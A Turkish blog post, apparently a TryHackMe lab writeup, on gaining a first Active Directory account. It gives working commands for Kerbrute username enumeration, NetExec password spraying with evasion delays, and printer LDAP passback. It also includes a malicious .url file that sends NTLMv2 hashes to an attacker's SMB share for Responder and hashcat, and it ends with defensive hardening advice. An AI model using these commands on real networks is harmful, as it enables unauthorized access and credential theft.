[Active Directory temellerini](post.html?p=tryhackme-active-directory-basics) kurduktan sonra sıra ilk gerçek adıma geldi: **AD breaching** — yani bir domain'e sıfırdan, elinde hiçbir kimlik bilgisi yokken ilk geçerli hesabı ele geçirmek. Bu, her AD saldırı zincirinin başlangıç noktası. O ilk hesap olmadan domain'i tarayamaz, yanal hareket edemez, yetki yükseltemezsin. İşin en zor kısmı da genellikle tam olarak budur: ilk foothold.

Bu yazı TryHackMe'nin **Intro to AD Breaching** odasının bir writeup'ı. Odanın dört ana tekniğini — OSINT'ten kullanıcı doğrulama, açık servislerde credential avı, password spraying ve coercion saldırıları — sırayla işliyorum. Her adımda ne yaptığımı, hangi komutu neden kullandığımı ve mantığını anlatıyorum.

> Uyarı: Bu teknikler yalnızca izinli ortamlarda (kendi lab'ın, THM, HTB) denenmelidir. İzinsiz kullanım suçtur.

## İlk credential neden bu kadar değerli?

"Düşük yetkili tek bir hesap ne işe yarar ki" diye düşünülebilir. Ama yanılgı burada: **kimliği doğrulanmış sıradan bir domain kullanıcısı bile** AD'ye kullanıcıları, grupları, bilgisayarları, group policy'leri ve güven ilişkilerini sorgulayabilir — kimliksiz birine kapalı olan her şeyi. Bu ilk tarama çoğu zaman Domain Admin'e giden yanlış yapılandırmaları ortaya çıkarır. Yani ilk hesap, kapıyı açan anahtardır.

### Breaching aşamasının saldırı yüzeyi

Tipik bir AD ortamı, ilk credential'ı elde etmek için hedeflenebilecek birçok servis açar:

- **SMB (445):** Dosya paylaşımları, uzaktan yönetim. Password spraying'in bir numaralı hedefi.
- **LDAP (389/636):** Dizin sorgu protokolü. Yanlış yapılandırılmış cihazlar LDAP kimlik bilgilerini saklar.
- **HTTP/HTTPS:** İç portallar, CI/CD platformları — loglarda ve config sayfalarında sık sık credential sızar.
- **Kerberos (88):** Ön kimlik doğrulama (pre-auth) davranışı, kullanıcı adlarının var olup olmadığını doğrulamak için kötüye kullanılabilir.
- **DNS (53):** Domain controller ve mail sunucusu gibi kritik altyapıyı bulmaya yarar.

Başlangıç konumun ya **unauthenticated** (black-box, elinde hiçbir şey yok — bu odanın senaryosu) ya da **authenticated** (grey-box, elinde düşük yetkili bir hesap var) olur. Hedef ikisinde de aynı: ortama daha derine inmeni sağlayacak geçerli bir hesap.

---

## 1. OSINT ve Kullanıcı Adı Doğrulama

Aktif saldırıdan önce hedefin bir resmini çıkarmak gerekir. Gerçek bir testte bu, **OSINT** ile başlar: LinkedIn, GitHub, veri sızıntıları, kurumsal "ekibimiz" sayfaları ve iş ilanlarından çalışan isimleri toplanır. Amaç basit — domain'de deneyeceğimiz **olası kullanıcı adlarının** listesini çıkarmak.

Çalışan isimlerinden kullanıcı adı üretirken kurumun **isimlendirme kuralını** bulmak esastır. Yaygın formatlar:

| Format | Örnek (Jane Smith) |
|---|---|
| first.last | jane.smith |
| firstlast | janesmith |
| flast | jsmith |
| first.l | jane.s |

Tek bir doğrulanmış e-posta bile genelde kuralı ele verir; gerisini o kalıpla üretirsin.

### Kerbrute ile kullanıcı adı doğrulama

Elimizde olası kullanıcı adları varken, hangilerinin **gerçekten domain'de var olduğunu** Kerbrute ile doğrularız. Kerbrute, Kerberos ön kimlik doğrulamasındaki bir davranışı kullanır: bir kullanıcı adı için AS-REQ gönderdiğimizde KDC, hesap yoksa `KDC_ERR_C_PRINCIPAL_UNKNOWN` döner; hesap varsa pre-auth ister.

```bash
kerbrute userenum -d thm.loc --dc 192.168.12.100 /root/usernames.txt -o valid_users.txt
```

- `userenum`: kullanıcı adı doğrulama modülü
- `-d thm.loc`: hedef domain (Kerberos realm)
- `--dc`: domain controller IP'si
- `-o`: geçerli kullanıcıları dosyaya kaydet

Çıktıda `[+] VALID USERNAME` ile işaretli her satır gerçek bir hesaptır.

**Neden bu kadar işe yarar?** Kerberos üzerinden kullanıcı doğrulama **hesap kilitlenmesi tetiklemez** — başarısız pre-auth istekleri başarısız giriş sayılmaz. Yani fark edilmeden koca bir listeyi doğrulayabilirsin. Yine de tamamen sessiz değildir: DC'de **Event ID 4768** üretir.

### DNS keşfi

Kullanıcı toplamanın yanında, kritik servisleri bulmak için hızlı bir DNS keşfi de yaparız. DNS, AD'nin omurgasıdır — DC'ler, mail sunucuları hep DNS kayıtlarında durur:

```bash
# Domain controller'ları bul (SRV kaydı)
nslookup -type=SRV _ldap._tcp.dc._msdcs.thm.loc 192.168.12.100
# Kerberos KDC
nslookup -type=SRV _kerberos._tcp.thm.loc 192.168.12.100
# Mail sunucuları
nslookup -type=MX thm.loc 192.168.12.100
```

---

## 2. Açık Servislerde Credential Avı

İlk kimlik bilgilerini elde etmenin en etkili yollarından biri, geliştirici ve yöneticilerin **yanlışlıkla bıraktığı** yerlere bakmaktır. Git repoları, CI/CD platformları ve dosya paylaşımları sık sık düz metin parola barındırır. Bu, MITRE ATT&CK'te **T1552 (Unsecured Credentials)** tekniğine karşılık gelir.

### Git repolarında credential avı

Git'in en sinsi yanı: bir sır dosyadan **silinse bile commit geçmişinde durur.** Erişilebilir bir repo (iç GitLab, Gitea ya da web'de açık kalmış bir `.git` dizini) bulduğunda bakılacak yerler: commit geçmişi, config dosyaları (`.env`, `web.config`, `appsettings.json`, `config.php`), koda gömülü sırlar ve CI/CD tanımları (`Jenkinsfile`, `.gitlab-ci.yml`).

Geçmişi elle taramak:

```bash
git log -p | grep -i "password\|secret\|token\|key\|credential"
```

Otomatik ve daha kapsamlı yol — **TruffleHog** tüm geçmişi yüksek-entropili dizeler ve bilinen credential kalıpları için tarar:

```bash
trufflehog git file:///path/to/repo
```

### Jenkins'te credential avı

Jenkins, iç ağlarda en sık rastlanan CI/CD platformu ve çoğu zaman bir hazine sandığı. Sık görülen zayıflıklar: varsayılan kimlik bilgileri (`admin:admin`) ya da hiç kimlik doğrulama olmaması. Credential'lar şuralarda sızar: build konsol çıktısı (ortam değişkenleri, bağlantı dizeleri), iş yapılandırmaları (`config.xml`), ortam değişkenleri ve workspace dosyaları.

Build loglarını API üzerinden de okuyabilirsin:

```bash
curl http://ci.thm.loc/job/JOB_NAME/lastBuild/consoleText | grep -i "password\|secret\|token\|credential"
```

> İpucu: İlk bulguda durma. Tam bir credential bulsan bile aramaya devam et — ek hesaplar, servis hesabı adları ya da parola kalıpları sonraki adımlarda işine yarar. Parolasız bir kullanıcı adı bile değerlidir; onu spraying listesine ekle.

---

## 3. Password Spraying

Bu noktada doğrulanmış bir kullanıcı adı listemiz ve belki kısmi istihbaratımız (bir onboarding parolası, bir kalıp) var. Hâlâ geçerli bir hesabımız yoksa, bir sonraki adım **password spraying**.

### Spraying vs brute-force

Fark kritik, çünkü doğrudan kilitlenip kilitlenmeyeceğini belirler:

- **Brute-force:** Tek hesaba çok sayıda parola dener. AD'de neredeyse kesin kilitlenme tetikler.
- **Password spraying:** Tek bir parolayı **çok sayıda hesaba** dener, sonra diğer parolaya geçer. Hesap başına deneme sayısı düşük kaldığı için kilitlenme eşiğinin altında kalır.

Spraying işe yarar çünkü karmaşıklık kuralları olsa bile kullanıcılar tahmin edilebilir kalıplara kayar: `Summer2025!`, `MegaCorp01!`, ya da onboarding'de verilen varsayılan parola.

### Önce kilitlenme politikasını öğren

Spray'den önce domain'in lockout politikasını bilmek şart. Elinde bir geçerli hesap varsa NetExec ile sorgula:

```bash
nxc smb 192.168.12.100 -u 'validuser' -p 'validpassword' --pass-pol
```

Çıktıda `Account Lockout Threshold: 5` ve `Reset Account Lockout Counter: 30` görürsen, 30 dakikalık pencerede güvenle **4 parolaya kadar** sprayleyebilirsin. Hesabın yoksa en güvenlisi dikkatli davranıp tek parola + uzun bekleme.

### NetExec ile spraying

NetExec (`nxc`), artık arşivlenmiş CrackMapExec'in halefi. Önce Kerbrute çıktısını temizleyelim:

```bash
grep "VALID USERNAME" valid_users.txt | awk '{print $NF}' | sed 's/@thm.loc//' > clean_users.txt
```

Tek parolayı SMB üzerinden tüm listeye spraylayalım:

```bash
nxc smb 192.168.12.100 -u clean_users.txt -p 'MegaCorp01!' --continue-on-success
```

`--continue-on-success` kritik: NetExec varsayılan olarak ilk başarılı girişte durur; bu bayrak aynı parolayı kullanan **tüm** hesapları bulmak için taramayı sürdürür.

### Sonuçları okumak

- `[+]` → başarılı kimlik doğrulama. Hedefimiz bu — ele geçirilmiş credential.
- `[-] STATUS_LOGON_FAILURE` → parola yanlış (beklenen cevap).
- `[-] STATUS_ACCOUNT_DISABLED` → hesap var ama devre dışı; kilitlenmeye saymaz ama kullanılamaz.
- `[-] STATUS_ACCOUNT_LOCKED_OUT` → **dur!** Kilitlenme tetikliyor olabilirsin; politikayı gözden geçir.
- `(Pwn3d!)` → başarılı girişin yanında çıkarsa, o hesap hedef makinede yerel yöneticidir — büyük kazanç.

> İpucu: Kilitlenme ve tespit riskini azaltmak için rastgele gecikme ekle: `--jitter 2-5`.

---

## 4. Coercion (Kimlik Doğrulamaya Zorlama) Saldırıları

Önceki teknikler ya var olan credential'ı buluyor ya tahmin ediyordu. **Coercion** tamamen farklı: bir cihazı ya da kullanıcıyı, kimlik doğrulama materyalini **bizim dinleyicimize göndermeye** kandırırız. MITRE ATT&CK'te **T1187 (Forced Authentication)**.

### LDAP Passback (yazıcı üzerinden)

Birçok ağ cihazı (yazıcı, tarayıcı, MFP) "scan-to-email" gibi özellikler için AD'ye LDAP ile bağlanır ve bunun için bir **servis hesabının** kimlik bilgilerini içinde saklar. LDAP passback, cihazın LDAP bağlantısını bizim makinemize yönlendirip bu kimlik bilgilerini yakalar:

1. Cihazın web yönetim paneline gir (çoğu zaman `admin:admin` gibi varsayılanla)
2. LDAP yapılandırma sayfasını bul
3. LDAP sunucu IP'sini **kendi IP'nle** değiştir
4. Bir dinleyici kur, sonra "Test Connection"a bas
5. Cihaz, sakladığı LDAP kimlik bilgilerini dinleyicine yollar

Düz metin LDAP (port 389) kullanan bir cihaz için basit bir Netcat dinleyici yeterli:

```bash
nc -lvnp 3489
```

"Test Connection"a basınca servis hesabının DN'i ve **düz metin parolası** çıktıda gelir. Yakaladığın credential'ı doğrula:

```bash
nxc smb 192.168.12.100 -u 'svc.ldap' -p 'CAPTURED_PASSWORD'
```

**Neden çalışıyor?** MFP ve IoT cihazları sertleştirmede en çok ihmal edilenlerdir: varsayılan parolalar, aşırı yetkili servis hesapları (bazen Domain Admin!), şifresiz LDAP ve hiç döndürülmeyen parolalar. (Modern cihazlar SASL/TLS kullanıyorsa Netcat yetmez; `slapd` ya da Impacket ile sahte bir LDAP sunucusu gerekir.)

### Dosya tabanlı coercion (`.url` + Responder)

Bu teknik bir cihazı değil, **bir kullanıcıyı** kandırır. Yazılabilir bir paylaşıma özel hazırlanmış bir dosya koyarız. Kullanıcı o klasörü Windows Explorer'da açınca, işletim sistemi dosyanın **ikonunu çizmeye** çalışır. İkon yolu bizim makinemize bir UNC yolu gösteriyorsa, Windows oraya gider ve kullanıcının **NTLMv2 hash'ini** gönderir — kullanıcı dosyayı açmadan, tıklamadan.

Zararlı `.url` dosyası:

```bash
cat > @Shortcut.url << 'EOF'
[InternetShortcut]
URL=http://thm.loc
WorkingDirectory=thm
IconFile=\\YOURTUN0IP\icons\icon.ico
IconIndex=1
EOF
```

Kritik alan `IconFile` — buradaki UNC yolu, Windows'un bizim makinemize SMB kimlik doğrulaması yapmasını tetikler. `'EOF'` tırnakları şart (yoksa bash çift ters eğik çizgileri bozar). Dosya adındaki baştaki `@`, dosyanın listede en üste çıkıp ilk render edilmesini sağlar.

> Not: Eskiden `.scf` ve `desktop.ini` da kullanılırdı ama Microsoft bunları güncel Windows 10/11'de yamaladı. `.url` hâlâ çalışıyor.

Hash'leri yakalamak için Responder'ı başlat:

```bash
sudo responder -I tun0
```

Dosyayı paylaşıma yükle:

```bash
smbclient //SERVER1.thm.loc/shared-docs -U 'THM\alice.moore%MegaCorp01!'
smb: \> put @Shortcut.url
```

Bir kullanıcı paylaşıma göz atınca Responder NTLMv2 hash'ini yakalar. Bu hash **doğrudan pass-the-hash için kullanılamaz** (Net-NTLMv2); çevrimdışı kırılması gerekir. Hashcat ile mod 5600:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Kırılınca, ne spray ne de açık sır bulmadan yeni bir geçerli credential elde etmiş oluruz.

> Daha ileri coercion teknikleri (PetitPotam, PrinterBug/SpoolSample, DFSCoerce) DC'leri bile kimlik doğrulamaya zorlayabilir; **relay** saldırılarıyla birleşince günümüzün en güçlü AD zincirlerinden birini oluşturur. Bunlar ayrı bir yazının konusu.

---

## Savunma tarafı: bu teknikler nasıl kapatılır?

Her tekniğin bir karşı önlemi var:

- **Sır yönetimi:** Credential'ları koda/config'e gömme; bir secrets vault (HashiCorp Vault, Azure Key Vault) kullan. `TruffleHog`/`Gitleaks` ile pre-commit taraması yap. Sızan sırrı sadece silme — **iptal et ve döndür** (Git geçmişinde kalır).
- **Parola politikası & lockout:** 14+ karakter; yaygın ve kuruma özgü kalıpları (şirket+yıl, mevsim+yıl) yasakla; her yeni hesaba benzersiz parola. Lockout eşiğini dengeli tut (5–10). **Birden çok hesapta dağıtık başarısız girişleri izle** — bu spraying imzasıdır.
- **Cihaz sertleştirme:** Yazıcı/MFP/IoT'de varsayılan parolaları değiştir; şifresiz LDAP (389) yerine **LDAPS (636)** kullan; yönetim arayüzlerini VLAN/IP ile kısıtla; cihaz entegrasyonlarına **düşük yetkili, salt-okunur** servis hesabı ver (asla Domain Admin).
- **Paylaşım güvenliği:** En az yetki prensibi; `.url`, `.lnk`, `.scf`, `desktop.ini` gibi dosyaları paylaşımlarda işaretle/izle.
- **NTLM sertleştirme:** NTLMv1'i kapat; **SMB signing** zorla (relay'i engeller); çevre güvenlik duvarında **dışarı SMB (445)** trafiğini engelle; mümkünse Kerberos'a geç.
- **Ağ segmentasyonu & MFA:** Yönetim arayüzlerini (yazıcı paneli, Jenkins, Git) ayrı yönetim VLAN'ına al; internete bakan ve kritik iç servislerde **MFA** zorla.

## Toparlarken

AD breaching, "ilk geçerli hesabı ele geçirme" sanatı. Dört ana yol gördük: **kullanıcı doğrulama** (Kerbrute), **açık servislerde credential avı** (Git, Jenkins), **password spraying** (NetExec) ve **coercion** (LDAP passback, `.url` + Responder). Hepsinin ortak noktası yine aynı: birinin "kolaylık olsun diye" aldığı bir kısayol.

İlk hesap elimizde olduğuna göre sıradaki adım, bununla domain'i **tarayıp** (enumeration) Domain Admin'e giden yolu bulmak — **BloodHound**, **Kerberoasting** ve relay saldırıları. AD serisinde bunlara da geleceğim.
